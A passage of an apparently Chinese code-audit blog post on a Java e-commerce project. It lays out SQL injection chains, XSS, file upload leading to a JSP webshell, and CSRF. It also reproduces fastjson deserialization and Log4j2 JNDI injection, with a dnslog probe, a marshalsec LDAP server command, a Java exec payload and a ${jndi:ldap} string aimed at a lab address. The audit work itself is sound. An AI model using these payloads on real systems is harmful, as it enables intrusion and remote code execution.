(sleep(5)))mscp)&amp;isDesc=true&amp;category_id=2&amp;category_id=3&amp;product_name=qwe,asd zxc</span><br></pre></td></tr></table></figure>\n<p><img src=\"S5Yz-EHBh8WNg554WYGuoUzqyYWGPaUN7DBpnf9Xqlc.png\" alt=\"image\"></p>\n<h4 id=\"SQL注入总结\"><a href=\"#SQL注入总结\" class=\"headerlink\" title=\"SQL注入总结\"></a>SQL注入总结</h4><p>本系统共审计发现6个SQL注入点且均已验证确认。下面是详细的污点传播链。</p>\n<ul>\n<li>SQL注入1：<br>RewardController(97)–&gt;RewardService.getList–&gt;RewardMapper.select –&gt;RewardMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入2：<br>  ForeProductListController(163)–&gt; ProductService.getMoreList–&gt;ProductMapper.selectMoreList–&gt;  ProductMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入3：<br>ProductController(405)–&gt;ProductService.getList–&gt; ProductMapper.select–&gt;  ProductMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入4：<br>ForeProductListController(168)–&gt;ProductService.getList–&gt; ProductMapper.select–&gt;ProductMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入5：<br>OrderController(176)–&gt;ProductOrderService.getList–&gt;ProductOrderMapper.select–&gt;ProductOrderService.xml(${orderUtil.orderBy})</li>\n<li>SQL注入6：<br>UserController(170)–&gt; UserService.getList–&gt;UserMapper.select–&gt;UserMapper.xml(${orderUtil.orderBy})</li>\n</ul>\n<p><img src=\"34NeD_tT0kwQbDrFJRE_QOjITFE0pW5d9lUxJk46GdY.png\" alt=\"image\"></p>\n<h3 id=\"XSS-反射\"><a href=\"#XSS-反射\" class=\"headerlink\" title=\"XSS(反射)\"></a>XSS(反射)</h3><ul>\n<li>requestScope：是EL表达式中的一个隐含对象，类似request，如：${requestScope.username} 表示在request域中取得username属性所对应的值</li>\n</ul>\n<p>搜索requestScope、map.put。</p>\n<p>触发链：ForeProductListController拿到了product_name后赋值给searchValue，未做处理之后直接map.put传到了request域，转到fore&#x2F;productListPage。</p>\n<p>链为：前端传参–&gt;ForeProductListController–&gt;获取参数–&gt;传到前端–&gt;展示（触发）</p>\n<p><img src=\"l2l6pMOC1jtn27Xp40uLZxt78j7BHP2Np46Kt31_6bA.png\" alt=\"image\"></p>\n<p>productListPage页面直接调用</p>\n<p><img src=\"XKRQ5fGyAcQ6Oyn6prR1mFeqgc7rg_efCoqkIpoAtVk.png\" alt=\"image\"></p>\n<p>验证</p>\n<p><img src=\"2h3pLjkdR6tzagmMau4Pkb9iIpI1gv7-dHFXlpnKN4s.png\" alt=\"image\"></p>\n<p><img src=\"RIWBAYLT2bE54OXw3PovYEUck53NunG-qcPDtzo6nAU.png\" alt=\"image\"></p>\n<h3 id=\"XSS（存储）\"><a href=\"#XSS（存储）\" class=\"headerlink\" title=\"XSS（存储）\"></a>XSS（存储）</h3><p>注册账号</p>\n<p>控制层拿到传入的user_name</p>\n<p><img src=\"NKIT6LiKZqM12dhte7k7ROSZXik3QcKOPqqlS4pl-z4.png\" alt=\"image\"></p>\n<p>创建用户对象，然后将用户对象传入到service层</p>\n<p><img src=\"oa6gt_8VHLNP-34_WdjujK0C2k9aoggYOy4U30bbUQU.png\" alt=\"image\"></p>\n<p>service调用dao层的接口</p>\n<p><img src=\"GOusN-7mvd-I0Ieeq2K72oFuq4IQdFLjrBhowtCD8Wo.png\" alt=\"image\"></p>\n<p><img src=\"ZA_N5lFepeyPq3aMnxLlfnB9ME77u-zBs9lJ9MhR1_c.png\" alt=\"image\"></p>\n<p>最终到了xml配置文件，执行SQL语句的地方，成功插入数据。</p>\n<p><img src=\"7xInJKQWGyGNz4JZenh61qxTRa2wAJZcfHpzHO2j_M0.png\" alt=\"image\"></p>\n<p>burp验证。</p>\n<p><img src=\"Zpu9O9AW14VXKYEx7BzYkQDW5-xwY3PYBZyDk4wYp5s.png\" alt=\"image\"></p>\n<p>看了下数据表，只要名字的长度不超过25就不会报错，不然报服务器500的错误。</p>\n<p><img src=\"Uih_0Rrw4zcFt1tR6nHq-cNJ5EnpoV7lvz3rwcs2R8Q.png\" alt=\"image\"></p>\n<p>登录账号之后触发。有一个页面是去获取数据库中存储的用户名的。所以登录之后直接出发XSS。</p>\n<p><img src=\"URvs16uQc_xgZ63ndFX3e_dWHCTLUd6Ako53blYkBJw.png\" alt=\"image\"></p>\n<p>触发链：</p>\n<p>访问tmall&#x2F;login，即可访问到ForeLoginController控制层的login，重定向到 fore&#x2F;loginPage</p>\n<p><img src=\"b4ufrbzQy2x1NNy3RjihfaBjnrIq7nFLYyWvq-bMoaQ.png\" alt=\"image\"></p>\n<p>登录页面的loginPage.jsp</p>\n<p><img src=\"Zoz2dHy4yuIJqg7zDzSdPSa282T6zWwUpYWbK8d6nqI.png\" alt=\"image\"></p>\n<p>调用了fore_login.js；如果后端响应返回成功，则访问&#x2F;tmall</p>\n<p><img src=\"7xY6hv2tiXTz0c0gGRYRa_W9rQZNGeecvgduRWflQU0.png\" alt=\"image\"></p>\n<p>登录成功返回</p>\n<p><img src=\"1rLYOoBiy_GcuM6mYL5R-Il8_O-bLqZDmTQJ8DakTPE.png\" alt=\"image\"></p>\n<p>主页，取出前面登录成功存进去的userId，判断用户是否登录。如果已经登录则把整改user对象传到Request。map.put(“user”, user)；其中user对象的数据会调用service层的userService.get，service会调用dao的userMapper.selectOne，selectOne去数据库根据这个userId查询信息。返回后封装成User对象。</p>\n<p><img src=\"0HfOGkNMdZwCSNwAIPyYOkjrtm4I-V9v9_Qh1X59M9A.png\" alt=\"image\"></p>\n<p>执行完上面的之后，跳转到fore&#x2F;homePage；homePage里面又包含了navigator.jsp</p>\n<p><img src=\"_16A5IdHxBc5eMux8NY-ORAkXOKUFKpPN0kulPfqTF0.png\" alt=\"image\"></p>\n<p>navigator.jsp触发</p>\n<p><img src=\"3TSQXgEcJ9Y56MH6f9rwmdLFzuBqf9_n_OLr_vL0gFo.png\" alt=\"image\"></p>\n<h3 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h3><h4 id=\"文件上传1\"><a href=\"#文件上传1\" class=\"headerlink\" title=\"文件上传1\"></a>文件上传1</h4><p>全局搜索upload</p>\n<p><img src=\"5jCZfY_15FLJfaHu_nYLsj3Fs4II2jM7wEaQdG7F1uc.png\" alt=\"image\"></p>\n<p>发现头像上传的controller，且不存在过滤。</p>\n<p>通过post上传文件，调用UUID随机数重命名文件之后直接保存到了res&#x2F;images&#x2F;item&#x2F;userProfilePicture&#x2F;目录，上传成功之后JSON格式返回状态以及文件名称。</p>\n<p>未对所上传的文件进行类型已经文件后缀校验，存在任意文件上传漏洞。</p>\n<p><img src=\"FEO_t3JVm1MSKbCCnAEVqHkXug_dZSXRM19zKwq4p2Q.png\" alt=\"image\"></p>\n<p>前台用户头像更换处</p>\n<p><img src=\"gtuL_Fd7R3Y9UBVUQfUQ95qZ8Mxwop9L8wsna-vRXFw.png\" alt=\"image\"></p>\n<p>使用蚁剑生成一个jsp的webshell，直接粘贴到bp进行上传。</p>\n<p><img src=\"zyqZl6Hpyqp_kKx0ucpJOI0vMhl3DY3Afjm-UQYdnwU.png\" alt=\"image\"></p>\n<p>连接URL：<a href=\"http://192.168.75.154:8090/tmall/res/images/item/userProfilePicture/e1dd8f9e-25bb-4d14-be97-0f378c49cdf9.jsp\">http://192.168.75.154:8090/tmall/res/images/item/userProfilePicture/e1dd8f9e-25bb-4d14-be97-0f378c49cdf9.jsp</a></p>\n<p>因为有个统一的前缀&#x2F;tmall，所以这个别忘记加上。</p>\n<p><img src=\"yVEiAhYiisiCH01WYjOZrZ2E1s-nrtg5PF5OE-TB5cU.png\" alt=\"image\"></p>\n<p><img src=\"7_XtDcER1-ZWdDXck5QA6j8INlOkYqetQ1HyoaY0m0E.png\" alt=\"image\"></p>\n<p>本项目存在4个文件上传点，且都可以进行getshell</p>\n<h4 id=\"文件上传2\"><a href=\"#文件上传2\" class=\"headerlink\" title=\"文件上传2\"></a>文件上传2</h4><p><img src=\"xZXCYI_skzpX3QvocLJBXgFYyF3hRuQbH98Y9jn5V0Y.png\" alt=\"image\"></p>\n<p><img src=\"4ZofkFAmvbWezVylXq4xRNNmv_Y22Vxb-u86IPZj2tQ.png\" alt=\"image\"></p>\n<p><img src=\"ZS3wfYz4GyRSD9nyWHgc-yOm4LpK4UFIHXEgLWfL5-U.png\" alt=\"image\"></p>\n<p><img src=\"rkTgEsjpNY2ExjI9SODeeVdhLa8F0p3dMRVvL8wfXjc.png\" alt=\"image\"></p>\n<h4 id=\"文件上传3\"><a href=\"#文件上传3\" class=\"headerlink\" title=\"文件上传3\"></a>文件上传3</h4><p>管理员头像上传</p>\n<p><img src=\"AQOXXqxaeV20vD5v1eEZpqRfTeityFJpqsV_H0uJS3U.png\" alt=\"image\"></p>\n<h4 id=\"文件上传4\"><a href=\"#文件上传4\" class=\"headerlink\" title=\"文件上传4\"></a>文件上传4</h4><p>添加产品处</p>\n<p><img src=\"g9BcswcLx3jFva0uCDLFfA1xwyuIRtd6fYdJhiwKAdk.png\" alt=\"image\"></p>\n<p><img src=\"_1a6Wed9yFY01DSimi-fbRq6NJQAQibnsuldmak_7oM.png\" alt=\"image\"></p>\n<h3 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h3><p>因项目没有其他过滤器校验Referer头，所以全局存在CSRF漏洞。</p>\n<p><img src=\"fyPyjMeHGyB3foieSIReNHa1W9KCNJXxT-daiXnhVjM.png\" alt=\"image\"></p>\n<p>验证</p>\n<p><img src=\"eXXiTbZ9W-O0Wh2kDRWgePYpPdhMgTU8FyJTi-SoAOE.png\" alt=\"image\"></p>\n<p><img src=\"EBdNXwilm1WtChdps91ukf0QHViF8COp_7BXj7bTpwY.png\" alt=\"image\"></p>\n<h3 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h3><p>搜索全局未发现可能引起SSRF的危险函数。</p>\n<h2 id=\"框架漏洞\"><a href=\"#框架漏洞\" class=\"headerlink\" title=\"框架漏洞\"></a>框架漏洞</h2><h3 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h3><p>拿到源码的时候，fastjson使用的是1.2.83版本；这个版本目前暂时安全。为了好玩一点，我们可以把版本降低一点来进行fastjson的反序列化攻击测试，我这里就直接改为了1.2.24。（当然这不算属于这个源码本身的漏洞，只是学习把版本降低进行测试。）</p>\n<p>搜索关键字JSON.parseObject（Json字符串转化为相应的对象）</p>\n<p><img src=\"suZ-Aty_CIAkbjBfk-Pj7-Ao2efd0RltOmKtrS98bkU.png\" alt=\"image\"></p>\n<p>更新产品属性的地方进行了JSON.parseObject（添加产品属性的地方也进行了JSON.parseObject）,没进行过滤，从前端获取到数据，直接传给JSON.parseObject。</p>\n<p><img src=\"uBjFPdMakVMEl9o-pAJ2ULEXEAdjCOkhASHx0FgChZ4.png\" alt=\"image\"></p>\n<p><img src=\"jZqZfxwvhLu7UKS8txMiIGs3MrBdqaXPDPQc-VPAOFE.png\" alt=\"image\"></p>\n<p><img src=\"yw8P6P4QKiSBqlSx-MN6j2i7lNxA9iNjZvbiZ3QKudY.png\" alt=\"image\"></p>\n<p>进行dnslog探测</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;garck3h&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;java.net.Inet4Address&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;val&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;666.eyle20.dnslog.cn&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"bYxVeXTjTX5cbZCkonJGRrfsx0aaAkTDcOvCTH7q3W4.png\" alt=\"image\"></p>\n<p><img src=\"dh6UpVpgr4kuOPU_LT9OgRDSZuV-cd8KSnaAZdjn8TU.png\" alt=\"image\"></p>\n<p>使用BCEL进行本地序列化成功弹计算器。</p>\n<p><img src=\"f8WcV8-fjogKnEk4fjhBaV3kpGhxfPYQeSo8-o1j2Mc.png\" alt=\"image\"></p>\n<p>使用Spring做回显，成功执行命令并且回显</p>\n<p><img src=\"CWCpnsfSkPTl3QqcCuOSNNnGg52aciyLi9y5UZVvGN0.png\" alt=\"image\"></p>\n<p>此外该系统还有其他功能点存在该漏洞</p>\n<h3 id=\"log4j2\"><a href=\"#log4j2\" class=\"headerlink\" title=\"log4j2\"></a>log4j2</h3><p>这里的log4j是2.20版本，属于安全版本。我改一下为2.14版本。测试一下log4j漏洞。</p>\n<p><img src=\"lAcfIK-Ol9vPNWWft8Y6JMJclVva5BZ7aGbYpNIF1p0.png\" alt=\"image\"></p>\n<p>全局搜索：logger.info；发现一个orderBy是可控的</p>\n<p><img src=\"M15QiIJCXqhwFSx95jCZ2-MAEybA7RHhxOs6lgXOW9E.png\" alt=\"image\"></p>\n<p><img src=\"Mo_LiEFaWsRyArUngTNoln12ZkF7YFHYEC6MqQnULn8.png\" alt=\"image\"></p>\n<p>使用dnslog进行探测，成功接收到请求。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">$<span class=\"punctuation\">&#123;</span>jndi<span class=\"punctuation\">:</span>ldap<span class=\"punctuation\">:</span><span class=\"comment\">//log4j.15k855.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"oMwirlis5rJehQMpkWYkxgGXtL1DQ3xt7a5VYckIJ_Q.png\" alt=\"image\"></p>\n<p><img src=\"p4H9naK8RBGr9E6NMItnUf3tviG3yQma81LE7Ba4zuw.png\" alt=\"image\"></p>\n<p>进行JNDI注入：</p>\n<p>写好的弹计算器的payload，然后使用Javac TestCmd.java进行编译</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestCmd</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">       <span class=\"type\">TestCmd</span> <span class=\"variable\">qwe</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TestCmd</span>();</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用marshalsec-0.0.3-SNAPSHOT-all.jar起ldap服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -<span class=\"built_in\">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class=\"string\">&quot;http://127.0.0.1:8888/#TestCmd&quot;</span></span><br></pre></td></tr></table></figure>\n<p>使用python3起http服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>\n<p>payload</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$&#123;jndi:ldap://192.168.75.154:1389/a&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"UW1eunoi1rK7JLYjRF1XDxEWG5eWa23k0cbZviLPtKE.png\" alt=\"image\"></p>\n<p>此外该系统还有其他功能点存在该漏洞</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>因为本次的mysql是部署在Linux服务器的，Linux区分大小写，但SQL文件里面的一些表名称是小写的，会导致表名不对，根据控制台提示进行修改即可。</li>\n<li>遇到错误“this is incompatible with sql_mode&#x3D;only_full_group_by ”；因为mysql 5.7.5版本以上默认的sql配置是:sql_mode&#x3D;“ONLY_FULL_GROUP_BY”。由于开启了ONLY_FULL_GROUP_BY的设置，如果select 的字段不在 group by 中，并且select 的字段未使用聚合函数（SUM,AVG,MAX,MIN等）的话，那么这条sql查询是被mysql认为非法的，会报错误。</li>\n<li>这项目不复杂，都是一些比较常规常见的漏洞，而且调用关系也清晰，审计起来比较轻松。该系统或还有一些没有挖掘的漏洞，望师傅们勿喷。</li>\n</ul>\n","categories":["代码审计"],"tags":["Java安全","代码审计"]}]